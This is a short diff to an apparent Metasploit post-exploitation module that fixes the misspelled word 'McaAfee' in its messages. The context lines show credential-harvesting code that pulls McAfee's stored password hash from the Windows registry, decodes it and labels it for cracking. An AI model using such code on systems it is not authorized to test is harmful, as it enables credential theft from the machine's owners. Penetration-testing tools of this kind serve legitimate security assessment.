@@ -47,17 +47,17 @@ class Metasploit3 < Msf::Post
 	
 	mcafee_hash = registry_getvaldata(check_reg, "UIPEx")
 	if mcafee_hash == nil or mcafee_hash == ""
-      print_error ("Could not find McaAfee password hash")
+      print_error ("Could not find McAfee password hash")
       return
 	else
 	  #Base64 decode mcafee_hash
 	  mcafee_version = registry_getvaldata(check_reg, "szProductVer")
 	  if mcafee_version.split(".")[0] == "8"
 		  mcafee_hash =  Rex::Text.to_hex(Rex::Text.decode_base64(mcafee_hash),"")
-		  print_good("McaAfee v8 password hash => #{mcafee_hash}");
+		  print_good("McAfee v8 password hash => #{mcafee_hash}");
 		  hashtype = "dynamic_1405"
 	  elsif mcafee_version.split(".")[0] == "5"
-		  print_good("McaAfee v5 password hash => #{mcafee_hash}");
+		  print_good("McAfee v5 password hash => #{mcafee_hash}");
 		  hashtype = "md5u"
 	  else	  
 		print_status("Could not identify the version of McAfee - Assuming v8")
